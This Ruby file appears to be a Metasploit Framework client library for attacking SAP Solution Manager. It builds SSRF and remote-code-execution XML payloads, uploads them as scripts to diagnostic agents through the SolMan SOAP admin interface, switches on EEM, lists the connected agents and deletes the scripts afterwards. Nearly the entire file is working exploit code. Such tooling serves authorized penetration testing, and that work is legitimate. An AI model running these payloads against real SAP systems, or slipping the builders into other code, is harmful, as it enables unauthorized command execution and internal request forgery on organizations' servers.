module Metasploit
  module Framework
    module SapSolutionManager
      module Client
        include Msf::Exploit::Remote::HttpClient

        PAYLOAD_XML = {
          xsi: 'http://www.w3.org/2001/XMLSchema-instance',
          editor_version: "7.10.1.0.2010#{Rex::Text.rand_text_numeric(10)}",
          exetype: 'xml',
          hrtimestamp: Time.now.utc,
          name: Rex::Text.rand_text_alphanumeric(12),
          timestamp: (Time.now.to_f * 1000).to_i,
          type: 'http',
          version: '1.1',
          schema_location: 'http://www.sap.com/solman/eem/script1.1',
          transaction_step_id: '1',
          transaction_step_name: Rex::Text.rand_text_alpha(12),
          prefix: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n",
          suffix: "\t</TransactionStep>\r\n</Script>\r\n"
        }.freeze

        PAYLOAD_XML[:prefix] << "<Script xmlns:xsi=\"#{PAYLOAD_XML[:xsi]}\" "
        PAYLOAD_XML[:prefix] << "editorversion=\"#{PAYLOAD_XML[:editor_version]}\" "
        PAYLOAD_XML[:prefix] << "exetype=\"#{PAYLOAD_XML[:exetype]}\" "
        PAYLOAD_XML[:prefix] << "hrtimestamp=\"#{PAYLOAD_XML[:hrtimestamp]}\" "
        PAYLOAD_XML[:prefix] << "name=\"#{PAYLOAD_XML[:name]}\" "
        PAYLOAD_XML[:prefix] << "timestamp=\"#{PAYLOAD_XML[:timestamp]}\" "
        PAYLOAD_XML[:prefix] << "type=\"#{PAYLOAD_XML[:type]}\" "
        PAYLOAD_XML[:prefix] << "version=\"#{PAYLOAD_XML[:version]}\" "
        PAYLOAD_XML[:prefix] << "xsi:noNamespaceSchemaLocation=\"#{PAYLOAD_XML[:schema_location]}\">\r\n"
        PAYLOAD_XML[:prefix] << "\t<TransactionStep id=\"#{PAYLOAD_XML[:transaction_step_id]}\" "
        PAYLOAD_XML[:prefix] << "name=\"#{PAYLOAD_XML[:transaction_step_name]}\">\r\n"

        # Make SSRF payload xml
        def make_ssrf_payload(method, uri)
          ssrf = {
            method: method,
            uri: uri,
            message_id: '2',
            message_name: 'index',
            message_type: 'ServerRequest',
            payload: ''
          }

          ssrf[:payload] << PAYLOAD_XML[:prefix]
          ssrf[:payload] << "\t\t<Message activated=\"true\" id=\"#{ssrf[:message_id]}\" method=\"#{ssrf[:method]}\" "
          ssrf[:payload] << "name=\"#{ssrf[:message_name]}\" type=\"#{ssrf[:message_type]}\" "
          ssrf[:payload] << "url=\"#{ssrf[:uri]}\" version=\"HTTP/1.1\"></Message>\r\n"
          ssrf[:payload] << PAYLOAD_XML[:suffix]
          ssrf[:payload]
        end

        # Make RCE payload xml
        def make_rce_payload(command)
          rce = {
            command: command,
            method: 'AssignJS',
            message_id: '2',
            message_name: 'AssignJS',
            message_type: 'Command',
            payload: ''
          }

          rce[:payload] << PAYLOAD_XML[:prefix]
          rce[:payload] << "\t\t<Message activated=\"true\" id=\"#{rce[:message_id]}\" type=\"#{rce[:message_type]}\""
          rce[:payload] << " url=\"\" name=\"#{rce[:message_name]}\" method=\"#{rce[:method]}\" >\r\n"
          rce[:payload] << "\t\t\t<Param name=\"expression\" value=\"#{rce[:command]}\" />\r\n"
          rce[:payload] << "\t\t\t<Param name=\"variable\" value=\"test\" />\r\n"
          rce[:payload] << "\t\t</Message>\r\n"
          rce[:payload] << PAYLOAD_XML[:suffix]
          rce[:payload]
        end

        # Make SOAP body for SSRF or RCE payload
        def make_soap_body(agent_name, script_name, payload)
          prefix = "\t<adm:uploadResource>\r\n"
          prefix << "\t\t<agentName>#{agent_name}</agentName>\r\n"
          prefix << "\t\t<fileInfos>\r\n"
          prefix << "\t\t\t<content>"

          suffix = "</content>\r\n"
          suffix << "\t\t\t<fileName>script.http.xml</fileName>\r\n"
          suffix << "\t\t\t<scenarioName>#{script_name}</scenarioName>\r\n"
          suffix << "\t\t\t<scope>Script</scope>\r\n"
          suffix << "\t\t\t<scriptName>#{script_name}</scriptName>\r\n"
          suffix << "\t\t</fileInfos>\r\n"
          suffix << "\t</adm:uploadResource>\r\n"

          "#{prefix}#{Base64.strict_encode64(payload)}#{suffix}"
        end

        # Check response from SAP SolMan server
        def check_response(response)
          if response.nil?
            raise 'The server not responding'
          elsif response.code != 200
            raise 'Bad response status code'
          elsif !response.headers['Content-Type'].strip.start_with?('text/xml')
            raise 'Response content type is not text/xml'
          elsif Nokogiri::XML(response.body).errors.any?
            raise 'Failed to parse response body'
          elsif !response.body.match?(/<soap-env:body>/i)
            raise 'Response body does not contain a SOAP body'
          elsif response.body.match?(/<soap-env:fault>/i)
            raise 'Response body contains errors'
          else
            response
          end
        end

        # Send SOAP request to SAP SolMan server
        def send_soap_request(soap_body, solman_path)

          data = Nokogiri::XML(<<-DATA, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/">
            <soapenv:Header/>
            <soapenv:Body>#{soap_body}</soapenv:Body>
          </soapenv:Envelope>
          DATA

          response = send_request_cgi({
            'uri' => normalize_uri(solman_path),
            'method' => 'POST',
            'data' => data,
            'ctype' => 'text/xml; charset=UTF-8',
            'headers' => { 'SOAPAction' => '""' }
          })
          check_response(response)
        end

        # Enable EEM in agent
        def enable_eem(agent_name, solman_path)
          soap_body = "\t<adm:setAgeletProperties>\r\n"
          soap_body << "\t\t<agentName>#{agent_name}</agentName>\r\n"
          soap_body << "\t\t<propertyInfos>\r\n"
          soap_body << "\t\t\t<flags>3</flags>\r\n"
          soap_body << "\t\t\t<key>eem.enable</key>\r\n"
          soap_body << "\t\t\t<value>True</value>\r\n"
          soap_body << "\t\t</propertyInfos>\r\n"
          soap_body << "\t</adm:setAgeletProperties>\r\n"
          send_soap_request(soap_body, solman_path)
        end

        # Set action (stopScript, deleteScript) script in agent
        def script_action(agent_name, script_name, script_action, solman_path)
          soap_body = "\t<adm:#{script_action}>\r\n"
          soap_body << "\t\t<agentName>#{agent_name}</agentName>\r\n"
          soap_body << "\t\t<scriptName>#{script_name}</scriptName>\r\n"
          soap_body << "\t</adm:#{script_action}>\r\n"
          send_soap_request(soap_body, solman_path)
        end

        # Stop script in agent
        def stop_script_in_agent(agent_name, script_name, solman_path)
          script_action(agent_name, script_name, 'stopScript', solman_path)
        end

        # Delete script in agent
        def delete_script_in_agent(agent_name, script_name, solman_path)
          script_action(agent_name, script_name, 'deleteScript', solman_path)
        end

        # Get connected agents info
        def make_agents_array(solman_path)
          agents = []
          all_agent_info = send_soap_request('<adm:getAllAgentInfo />', solman_path)
          response_xml = Nokogiri::XML(all_agent_info.body)
          response_xml.css('return').each do |agent|
            os_name = ''
            java_version = ''
            agent.css('systemProperties').each do |system_properties|
              case system_properties.at_xpath('key').content
              when 'os.name'
                os_name = system_properties.at_xpath('value').content
              when 'java.version'
                java_version = system_properties.at_xpath('value').content
              end
            end
            agents.push({
              serverName: agent.at_xpath('serverName').content,
              hostName: agent.at_xpath('hostName').content,
              instanceName: agent.at_xpath('instanceName').content,
              osName: os_name,
              javaVersion: java_version
            })
          end
          agents
        end

        # For print agents array
        def make_pretty_table(array)
          pretty_string = "+-#{@columns.map { |_, g| '-' * g[:width] }.join('-+-')}-+"
          pretty_string += "\n| #{@columns.map { |_, g| g[:label].ljust(g[:width]) }.join(' | ')} |"
          pretty_string += "\n+-#{@columns.map { |_, g| '-' * g[:width] }.join('-+-')}-+"
          array.each do |line|
            str = line.keys.map { |k| line[k].ljust(@columns[k][:width]) }.join(' | ')
            pretty_string += "\n| #{str} |"
          end
          pretty_string += "\n+-#{@columns.map { |_, g| '-' * g[:width] }.join('-+-')}-+"
          pretty_string
        end

        # Pretty print connected agents array
        def pretty_agents_table(agents)
          @agent_labels = {
            serverName: 'Server Name',
            hostName: 'Host Name',
            instanceName: 'Instance Name',
            osName: 'OS Name',
            javaVersion: 'Java Version'
          }
          @columns = @agent_labels.each_with_object({}) do |(col, label), h|
            h[col] = { label: label, width: [agents.map { |g| g[col].size }.max, label.size].max }
          end
          make_pretty_table(agents)
        end

        private :script_action
        private :make_pretty_table
      end
    end
  end
end
